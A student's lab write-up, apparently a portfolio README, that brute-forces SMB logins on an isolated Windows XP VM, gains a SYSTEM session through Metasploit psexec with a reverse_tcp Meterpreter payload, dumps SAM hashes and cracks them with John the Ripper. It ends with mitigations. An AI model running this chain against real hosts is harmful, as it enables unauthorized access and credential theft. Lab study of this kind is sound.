# SMB Authentication Brute-Force and SAM Hash Extraction on a Windows XP Machine Using Kali Linux

**Personal lab project — Offensive Security portfolio**
**Author:** Abdullah (TP088281)
**Attacker:** Kali Linux · **Target:** Windows XP SP3 (isolated VMware lab)
**Tools:** Nmap · Metasploit · Meterpreter · John the Ripper

> ⚠️ **Disclaimer / Ethics**
> All work in this project was performed in a **private, isolated VMware lab** using virtual machines I own. No real systems, networks, or third-party services were touched. This repository is for **educational purposes only** to demonstrate ethical hacking methodology. Do **not** apply these techniques to any system you do not own or have explicit written permission to test.

---

## 1. Project Overview

This project demonstrates a full **password-attack and authentication-testing** chain against a legacy Windows XP host, performed from Kali Linux following a structured ethical-hacking methodology:

**Recon → Scanning → Vulnerability Identification → Exploitation → Impact Analysis → Countermeasures**

The attack recovers a weak Windows account password over SMB, uses it to gain a SYSTEM-level remote session, extracts the SAM password-hash database, and cracks the hashes offline — proving the real-world risk of weak credentials and legacy authentication (LM/NTLM) on an unhardened host.

---

## 2. Lab Environment

| Role | Machine | IP Address | Notes |
|------|---------|------------|-------|
| Attacker | Kali Linux | `192.168.18.132` | Metasploit, nmap, John the Ripper |
| Target | Windows XP | `192.168.18.128` | SMB (445/139), host firewall disabled for lab |
| Network | VMware Host-Only | `192.168.18.0/24` | Isolated — no internet / no real hosts |

**Vulnerable condition created for the demo (realistic scenario):** a local **administrator** account with a weak, guessable password.

---

## 3. Target Preparation (one-time lab setup)

On the **Windows XP** VM:

1. **Set network to Host-Only** in VMware so the VM is isolated.
2. **Disable the host firewall** (so services are reachable — see §8, this is itself a lesson):
   ```cmd
   netsh firewall set opmode disable
   ```
3. **Enable the classic auth model** so SMB credential tests return true/false per account:
   `secpol.msc` → Local Policies → Security Options →
   **"Network access: Sharing and security model for local accounts" → Classic**
4. **Create a weak-password admin account** (the vulnerable target):
   `lusrmgr.msc` → Users → New User → `itadmin` / `password123` → add to **Administrators** group.

---

## 4. Attacker Identity (required for marking)

Every screenshot must show my own identity. Run this banner in Kali and keep it visible in each capture:

```bash
mkdir -p ~/TP088281_EHIR/screenshots && cd ~/TP088281_EHIR
echo "Abdullah | TP088281 | EHIR Section One - Password Attack"; whoami; hostname; ip -4 addr show eth0 | grep inet
```

📸 `screenshots/01-identity.png`

---

## 5. Step-by-Step Attack

### Phase 1 — Footprinting & Scanning

**Host discovery:**
```bash
sudo nmap -sn 192.168.18.0/24
```

**Service, version & OS detection on the target:**
```bash
sudo nmap -sS -sV -O -p- 192.168.18.128
```

Expected result — SMB services exposed and the OS fingerprinted as Windows XP:
```
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Microsoft Windows XP microsoft-ds
Running: Microsoft Windows XP ...
```

📸 `screenshots/02-nmap-recon.png`

**SMB enumeration (NSE scripts):**
```bash
nmap -p139,445 --script smb-os-discovery,smb-security-mode,smb-enum-shares -T4 192.168.18.128
```

📸 `screenshots/03-smb-enum.png`

> **Tip:** a full all-ports scan (`-p-`) with `-sV -O` is slow against legacy VMs. If you only need the attack surface, scan the SMB ports directly: `sudo nmap -sS -sV -p 135,139,445,3389 -T4 192.168.18.128`.

---

### Phase 2 — Vulnerability Identification

From the scan output, the host presents:

- **SMB (445/139) exposed** with no network-level restriction.
- **Legacy SMBv1 / NTLMv1 authentication** — vulnerable to offline hash cracking.
- **Weak local credentials** permitted (no account lockout, no password policy).
- **LM hashing** likely enabled (XP default) — trivially crackable.

These make the host a strong candidate for a **credential brute-force → authenticated access → hash extraction** attack.

---

### Phase 3 — Exploitation (A): SMB Credential Brute-Force

Create small wordlists for a fast, controlled demo:
```bash
printf 'administrator\nitadmin\nadmin\nuser\n' > users.txt
printf 'password\n123456\npassword123\nadmin\nletmein\nqwerty\n' > pass.txt
```

Run the Metasploit SMB login scanner:
```bash
msfconsole -q
use auxiliary/scanner/smb/smb_login
set RHOSTS 192.168.18.128
set USER_FILE /home/samawi/TP088281_EHIR/users.txt
set PASS_FILE /home/samawi/TP088281_EHIR/pass.txt
set VERBOSE true
run
```

Expected — a valid credential found:
```
[+] 192.168.18.128:445 - Success: '.\itadmin:password123'
```

📸 `screenshots/04-smb-bruteforce.png`

> Alternative tool: `hydra -L users.txt -P pass.txt smb://192.168.18.128`

---

### Phase 4 — Exploitation (B): Authenticated Access + SAM Hash Dump

Use the recovered credentials to get a remote session via PsExec:
```bash
use exploit/windows/smb/psexec
set RHOSTS 192.168.18.128
set SMBUser itadmin
set SMBPass password123
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.18.132
run
```

At the `meterpreter >` prompt, confirm privilege and extract hashes:
```bash
getuid        # => NT AUTHORITY\SYSTEM
sysinfo
hashdump
```

Save the dumped hashes on Kali (paste the `hashdump` lines):
```bash
nano ~/TP088281_EHIR/hashes.txt
```

📸 `screenshots/05-access-hashdump.png`

---

### Phase 5 — Offline Password Cracking

Crack the extracted LM/NTLM hashes with John the Ripper and the `rockyou` wordlist:
```bash
sudo gunzip -k /usr/share/wordlists/rockyou.txt.gz 2>/dev/null
john --format=lm --wordlist=/usr/share/wordlists/rockyou.txt ~/TP088281_EHIR/hashes.txt
john --format=nt --wordlist=/usr/share/wordlists/rockyou.txt ~/TP088281_EHIR/hashes.txt
john --show ~/TP088281_EHIR/hashes.txt
```

Expected — recovered plaintext passwords listed.

📸 `screenshots/06-john-crack.png`

> Hashcat equivalent: `hashcat -m 3000 hashes.txt rockyou.txt` (LM) · `hashcat -m 1000 hashes.txt rockyou.txt` (NTLM)

---

## 6. Impact Analysis

A successful run of this chain means an attacker can:

- **Authenticate as a local administrator** using nothing but a guessed password.
- **Execute code remotely as SYSTEM** (full control of the host) via PsExec.
- **Extract every account's password hash** from the SAM database.
- **Recover plaintext passwords offline**, enabling lateral movement and **credential reuse** across other systems (password reuse is extremely common).
- Achieve complete loss of **confidentiality, integrity, and availability** for the target — install malware, exfiltrate data, create persistence, or pivot deeper into the network.

---

## 7. Countermeasures

| Weakness Exploited | Mitigation |
|--------------------|------------|
| Weak / guessable password | Enforce strong password policy + **account lockout** after failed attempts |
| SMB exposed to the network | Restrict SMB with host/network firewall; segment legacy hosts |
| LM/NTLMv1 hashes stored | Disable LM hash storage (`NoLMHash`); enforce NTLMv2 / Kerberos |
| Legacy, unpatched OS | Decommission Windows XP; migrate to a supported, patched OS |
| PsExec / admin-share abuse | Limit local-admin accounts; monitor SMB logons; disable admin shares where possible |
| No detection | Deploy IDS/EDR and log/alert on brute-force and lateral-movement patterns |

**Lab evidence point:** when the host firewall was enabled, all SMB ports returned `filtered` and the attack surface was unreachable — demonstrating that even a basic host firewall materially reduces exposure.

---

## 8. Tools Used

| Tool | Purpose |
|------|---------|
| **nmap** | Host discovery, service/version detection, SMB enumeration |
| **Metasploit** (`smb_login`, `psexec`) | Credential brute-force & authenticated remote access |
| **Meterpreter** (`hashdump`) | SAM password-hash extraction |
| **John the Ripper** | Offline LM/NTLM hash cracking |

---

## 9. References

- Microsoft. (2017). *Security Advisory — SMB / Legacy authentication.*
- Offensive Security. *Metasploit Unleashed — SMB Login & PsExec Modules.*
- Openwall. *John the Ripper documentation.*
- Nmap. *NSE SMB scripts reference.*

*(Full APA references are formatted in the project report under `report/`.)*

---

## Repository Structure

```
password-attack-winxp-kali/
├── README.md                 # this file
├── screenshots/
│   ├── 01-identity-kali.png
│   ├── 01b-identity-xp.png
│   ├── 02-nmap-recon.png
│   ├── 03-smb-enum.png
│   ├── 04-smb-bruteforce.png
│   ├── 05-access-hashdump.png
│   └── 06-john-crack.png
└── report/
    ├── Password_Attack_WinXP_Kali_Report.docx
    └── report.pdf
```
